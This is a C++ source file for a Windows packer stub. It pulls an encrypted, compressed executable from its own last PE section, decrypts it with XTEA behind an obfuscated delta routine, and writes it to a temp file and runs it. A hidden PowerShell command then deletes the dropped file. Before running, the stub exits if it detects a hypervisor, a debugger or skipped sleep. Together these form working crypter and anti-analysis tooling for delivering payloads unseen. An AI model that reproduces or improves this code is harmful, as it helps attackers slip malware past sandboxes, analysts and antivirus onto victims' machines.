#include <stdio.h>
#include <fstream>
#include <vector>
#include <cstdint>
#include <windows.h>
#include <winternl.h>
#include <ntstatus.h>
#include <zlib.h>
#include <tlhelp32.h>
#include <capstone/capstone.h>
#include <unordered_map>
#include <bits/stdc++.h>
#include <psapi.h>
#include <psdk_inc/intrin-impl.h>

typedef NTSTATUS (WINAPI *NtQueryInformationProcess_t)(
    HANDLE procHandle, 
    DWORD processInformationClass, 
    PVOID processInformation, 
    ULONG processInformationLength, 
    PULONG returnLength
);

struct HiddenFile{
    BYTE* content;
    long size;
};

long getSizeOfFile(FILE* file){
    fseek(file, 0, SEEK_END);
    long size = ftell(file);
    fseek(file, 0, SEEK_SET);
    return size;
}

bool decompress(BYTE* input, uInt inputSize, BYTE* output, uInt* outputSize){
    z_stream stream = {0};
    stream.next_in = input;
    stream.avail_in = inputSize;
    stream.next_out = output;
    stream.avail_out = *outputSize;
    int returnValue = inflateInit(&stream);
    if(returnValue != Z_OK){
        printf("[FAIL] Initiate decompress function\n");
        return false;
    }

    returnValue = inflate(&stream, Z_FINISH);
    if(returnValue != Z_STREAM_END){
        printf("[FAIL] Decompress function executed\n");
        return false;
    }

    inflateEnd(&stream);
    *outputSize = stream.total_out;
    return true;
}

uint32_t generateDelta(){
    int x = 3;
    uint32_t delta = 0xDEADBEEF;
    uint32_t aux1, aux2, aux3;
    for(int i=0; i<10; i++){
        switch (x)
        {
            case 0:
                aux3 = aux2 | 0xB9 & 0XFF;
                x = 7;
                break;
            case 1:
                aux1 = 0x37 << 16; 
                x = 9;
                break;
            case 2:
                delta = delta ^ 0XBAADF00D;
                x = 5;
                break;
            case 3:
                delta = 0x9E;
                x = 6;
                break;
            case 4:
                delta = delta | aux2;
                x = 8;
                break;
            case 5:
                delta = delta ^ 0XBAADF00D;
                break;
            case 6:
                delta = delta << 24;
                x = 1;
                break;
            case 7:
                delta = delta | aux1;
                x = 4;
                break;
            case 8:
                delta = delta | aux3;
                x = 2;
                break;
            case 9:
                aux2 = 0x79 << 8;
                x = 0;
                break;
            default:
                break;
        }
    }
    return delta;
}

void decrypt(uint32_t* encryptedtextBlock, uint32_t* key, uint32_t delta) {
    uint32_t half0 = encryptedtextBlock[0], half1 = encryptedtextBlock[1], numberOfRounds = 32;
    uint32_t sum = delta * numberOfRounds;
    for (uInt i = 0; i < numberOfRounds; ++i) {
        half1 -= (((half0 << 4) ^ (half0 >> 5)) + half0) ^ (sum + key[(sum >> 11) & 3]);
        sum -= delta;
        half0 -= (((half1 << 4) ^ (half1 >> 5)) + half1) ^ (sum + key[sum & 3]);
    }
    encryptedtextBlock[0] = half0; 
    encryptedtextBlock[1] = half1;
}

BYTE* decryptAll(BYTE* data, size_t size, uint32_t* key, size_t& outOriginalSize) {
    BYTE* decrypted = (BYTE*)malloc(size);
    if(decrypted == NULL){
        printf("[FAIL] Allocate memory for decrypted file\n");
        return NULL;
    }

    memcpy(decrypted, data, size);
    uint32_t delta = generateDelta();

    for (size_t i = 0; i < size; i += 8) {
        decrypt((uint32_t*)(decrypted + i), key, delta);
    }

    outOriginalSize = *(uint32_t*)decrypted;
    BYTE* result = (BYTE*)malloc(outOriginalSize);
    if(result == NULL){
        printf("[FAIL] Allocate memory for decrypted file\n");
        return NULL;
    }

    memcpy(result, decrypted + 4, outOriginalSize);
    free(decrypted);

    return result;
}

HiddenFile* findSection(char *fileName){
    FILE *packedFile = fopen(fileName, "rb");
    if(packedFile == NULL){
        printf("[FAIL] Open current file\n");
        return NULL;
    }

    IMAGE_DOS_HEADER dosHeader;
    fread(&dosHeader, sizeof(IMAGE_DOS_HEADER), 1, packedFile);
    if(ferror(packedFile)){
        printf("[FAIL] Read current file - DOS Header\n");
        return NULL;
    }
    long fileHeaderOffset = dosHeader.e_lfanew;
    fseek(packedFile, fileHeaderOffset, SEEK_SET);

    IMAGE_NT_HEADERS fileHeader;
    fread(&fileHeader, sizeof(IMAGE_NT_HEADERS), 1, packedFile);
    if(ferror(packedFile)){
        printf("[FAIL] Read current file - NT Headers\n");
        return NULL;
    }
    int lastSectionIndex = fileHeader.FileHeader.NumberOfSections-1;
    fseek(packedFile, sizeof(IMAGE_SECTION_HEADER) * lastSectionIndex, SEEK_CUR);
    
    IMAGE_SECTION_HEADER lastSection;
    fread(&lastSection, sizeof(IMAGE_SECTION_HEADER), 1, packedFile);
    if(ferror(packedFile)){
        printf("[FAIL] Read current file - last Section Header\n");
        return NULL;
    }

    int addressOfFile = lastSection.PointerToRawData;
    long sizeOfPackedFile = getSizeOfFile(packedFile);
    if(sizeOfPackedFile == -1){
        printf("[FAIL] Get size of current file\n");
        return NULL;
    }
    uint32_t paddingForOutput = sizeof(DWORD) + 4 * sizeof(uint32_t);

    long sizeOfEncryptedSection = sizeOfPackedFile - addressOfFile - paddingForOutput;

    DWORD originalFileSize;
    uint32_t key[4];

    //---------------------------

    BYTE* packedFileContent = (BYTE*)malloc(sizeOfEncryptedSection);
    if(packedFileContent == NULL){
        printf("[FAIL] Allocate memory for new file\n");
        return NULL;
    }

    uint32_t initialPaddingForOutput = sizeof(DWORD) + sizeof(key[0]);
    size_t middleKeyOffset = (sizeOfEncryptedSection - paddingForOutput) / 3;

    fseek(packedFile, addressOfFile, SEEK_SET);   
    fread(packedFileContent, paddingForOutput, 1, packedFile);
    if(ferror(packedFile)){
        printf("[FAIL] Read current file - last Section\n");
        return NULL;
    }

    fread(key, sizeof(key[0]), 1, packedFile);  
    fread(&originalFileSize, sizeof(DWORD), 1, packedFile);

    if(ferror(packedFile)){
        printf("[FAIL] Read current file\n");
        return NULL;
    }

    fread(packedFileContent + paddingForOutput, middleKeyOffset, 1, packedFile);
    if(ferror(packedFile)){
        printf("[FAIL] Read current file - last Section\n");
        return NULL;
    }
    fread(key+1, sizeof(key[0]), 1, packedFile);

    fread(packedFileContent + paddingForOutput + middleKeyOffset, middleKeyOffset, 1, packedFile);
    if(ferror(packedFile)){
        printf("[FAIL] Read current file - last Section\n");
        return NULL;
    }
    fread(key+2, sizeof(key[0]), 1, packedFile);
    size_t restOfFile = sizeOfEncryptedSection - paddingForOutput - 2*middleKeyOffset;

    fread(packedFileContent + paddingForOutput + 2*middleKeyOffset, restOfFile, 1, packedFile);
    if(ferror(packedFile)){
        printf("[FAIL] Read current file - last Section\n");
        return NULL;
    }
    fread(key+3, sizeof(key[0]), 1, packedFile);
    
    size_t decryptedSize = 0;
    BYTE* decryptedFileContent = decryptAll(packedFileContent, sizeOfEncryptedSection, key, decryptedSize);
    if(decryptedFileContent == NULL){
        printf("[FAIL] Decryption of file\n");
        return NULL;
    }
    printf("[SUCCESS] Decryption of file\n");

    HiddenFile *hiddenFile = (HiddenFile *)malloc(sizeof(HiddenFile));
    if(hiddenFile == NULL){
        printf("[FAIL] Allocate memory for HiddenFile struct\n");
        return NULL;
    }
    hiddenFile->content = (BYTE*)malloc(originalFileSize);
    if(hiddenFile->content == NULL){
        printf("[FAIL] Allocate memory for content of HiddenFile struct\n");
        return NULL;
    }
    uInt *decompressedSize = (uInt*)malloc(sizeof(uInt));
    if(decompressedSize == NULL){
        printf("[FAIL] Allocate memory for decompressed file size\n");
        return NULL;
    }

    if(!decompress(decryptedFileContent, decryptedSize, hiddenFile->content, decompressedSize)){
        printf("[FAIL] Decompression of file\n");
        return NULL;
    }
    printf("[SUCCESS] Decompression of file\n");

    hiddenFile->size = *decompressedSize;

    HeapFree(GetProcessHeap(), 0, decompressedSize);
    HeapFree(GetProcessHeap(), 0, decryptedFileContent);
    HeapFree(GetProcessHeap(), 0, packedFileContent);
    fclose(packedFile);

    return hiddenFile;
}

bool runPE(BYTE* peData, size_t peSize) {
    wchar_t tempPath[MAX_PATH], tempFile[MAX_PATH];
    GetTempPathW(MAX_PATH, tempPath);
    GetTempFileNameW(tempPath, L"tmp", 0, tempFile);

    FILE* fp = _wfopen(tempFile, L"wb");
    if(!fp){
        printf("[FAIL] Open temp file\n");
        return false;
    }
    size_t written = fwrite(peData, 1, peSize, fp);
    if(written < peSize){
        printf("[FAIL] Write temp file\n");
        return false;
    }
    fclose(fp);

    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi = {};
    if (!CreateProcessW(tempFile, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
        DeleteFileW(tempFile);
        return false;
    }

    // command to wait for PID, then delete the EXE
    wchar_t cmd[2 * MAX_PATH + 100];
    swprintf(cmd, 2 * MAX_PATH + 100,
        L"cmd /c timeout /t 1 > nul & "
        L"powershell -command \""
        L"while (Get-Process -Id %u -ErrorAction SilentlyContinue) "
        L"{ Start-Sleep -Milliseconds 500 }; "
        L"Remove-Item -Force -LiteralPath '%s'\"",
        pi.dwProcessId, tempFile);

    STARTUPINFOW si2 = { sizeof(si2) };
    PROCESS_INFORMATION pi2 = {};
    CreateProcessW(NULL, cmd, NULL, NULL, FALSE,
                   CREATE_NO_WINDOW, NULL, NULL, &si2, &pi2);

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);

    if(pi2.hThread){
        CloseHandle(pi2.hThread);
    }
    
    if (pi2.hProcess){
        CloseHandle(pi2.hProcess);
    } 

    return true;
}

bool starting(char *fileName){
    
    if(fileName == NULL){
        printf("[FAIL] Invalid file name\n");
        return false;
    }

    HiddenFile* payloadFile = findSection(fileName);
    if(payloadFile == NULL){
        printf("[FAIL] Get hidden file\n");
        return false;
    }
    printf("[SUCCESS] Get hidden file\n");
    
    if(runPE(payloadFile->content, payloadFile->size) == false){
        printf("[FAIL] Execute file\n");
        return false;
    }

    free(payloadFile->content);
    free(payloadFile);
    return true;
}

bool isDebugged(){
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if(hNtdll == NULL){
        printf("[FAIL] Get ntdll.dll handle for debug\n");
        return true;
    }
    NtQueryInformationProcess_t NtQueryInformationProcess = (NtQueryInformationProcess_t)GetProcAddress(hNtdll, "NtQueryInformationProcess");

    DWORD debugFlag = 0;
    // NtQueryInformationProcess(GetCurrentProcess(), ProcessDebugFlags, &debugFlag, sizeof(debugFlag), NULL);
    if(NtQueryInformationProcess(GetCurrentProcess(), ProcessDebugFlags, &debugFlag, sizeof(debugFlag), NULL) == STATUS_SUCCESS){
        return !debugFlag;
    }else{
        printf("[FAIL] Query the process for debug\n");
    }
    return true;
}

bool isTimeSkipped(){
    /*  
        check for sleep manipulation - first
        use a high resolution timestamps
    */
    LARGE_INTEGER frequency, counter1, counter2;

    //get the number of CPU ticks within a second
    if(QueryPerformanceFrequency(&frequency) == 0){     
        printf("[FAIL] Query frequency\n");
        return true;
    }
    if(QueryPerformanceCounter(&counter1) == 0){
        printf("[FAIL] Query counter 1\n");
        return true;
    } 

    Sleep(500);
    if(QueryPerformanceCounter(&counter2) == 0){
        printf("[FAIL] Query counter 2\n");
        return true;
    }
    
    // debugger may skip sleep functions so need to check for it
    if(((double)(counter2.QuadPart  - counter1.QuadPart) * 1000.0 / (double)frequency.QuadPart) < 490){     
        return true;
    }

    return false;
}

bool isUnderVirtualEnv(){
    
    int cpuInfo[4] = { -1 };

    __cpuid(cpuInfo, 1);

    if (!(cpuInfo[2] >> 31) & 1) { //check the last bit of ecx register
        return false;
    }

    char hypervisor_vendor[13] = {};
    __cpuid(cpuInfo, 0x40000000);
    memcpy(hypervisor_vendor + 0, &cpuInfo[1], 4); // ebx
    memcpy(hypervisor_vendor + 4, &cpuInfo[2], 4); // ecx
    memcpy(hypervisor_vendor + 8, &cpuInfo[3], 4); // edx
    hypervisor_vendor[12] = '\0';

    std::string vendor = hypervisor_vendor;

    if (vendor == "KVMKVMKVM" || vendor == "VMwareVMware" || vendor == "VBoxVBoxVBox" || 
        vendor == "prl hyperv" || vendor == " lrpepyh  vr" || vendor == "TCGTCGTCGTCG"){
        return true;
    }

    return false;
}

char* getCurrentFileName(char* fullPath){
    char* fileName;
    char* token = strtok(fullPath, "\\");
    while(token != NULL){
        fileName = token;
        token = strtok(NULL, "\\");
    }
    return fileName;
}

int main(int argc, char* argv[]){
    if(isUnderVirtualEnv()){
        printf("[FAIL] Run - hypervisor detected\n");
        return 0;
    }
    if(isDebugged() || isTimeSkipped()){
        printf("[FAIL] Run - debug detected\n");
        return 0;
    }
    if(!starting(getCurrentFileName(argv[0]))){
        printf("[FAIL] Run\n"); 
    }
    return 0;
}